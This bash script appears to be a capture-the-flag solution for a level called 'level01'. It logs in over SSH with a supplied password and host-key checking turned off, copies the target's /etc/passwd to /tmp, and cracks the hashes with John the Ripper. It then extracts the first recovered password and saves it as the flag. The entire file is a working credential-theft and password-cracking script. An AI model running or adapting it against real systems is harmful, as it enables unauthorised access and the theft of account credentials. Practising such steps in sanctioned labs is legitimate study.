#!/usr/bin/env bash

# Check that the user provided the right number of arguments
if [ ! -z "$1" ] && [ ! -z "$2" ] && [ ! -z "$3" ]; then
    # Download the /etc/passwd file from the target machine
    sshpass -p $3 scp -o StrictHostKeyChecking=no -P $2 level01@$1:/etc/passwd /tmp/
    # Display the contents of the passwd file
    cat /tmp/passwd
    # Crack the passwd file using john the ripper
    echo -e "\nCracking with john...\n"
    john /tmp/passwd --format=crypt
    EXIT_STATUS=$?
    if ! (exit $EXIT_STATUS); then
        echo "Error decrypting passwd with john">&2
        exit 1
    fi
    # Extract the password
    flag=$(john /tmp/passwd --show | awk -F: 'NR==1 {print $2}')
    # Display the password
    echo -e "Password:\n$flag"
    # Save the password
    echo $flag > flag01.pwd
else
    echo "Usage: ./flag01.sh <ip address> <port> <password>"
fi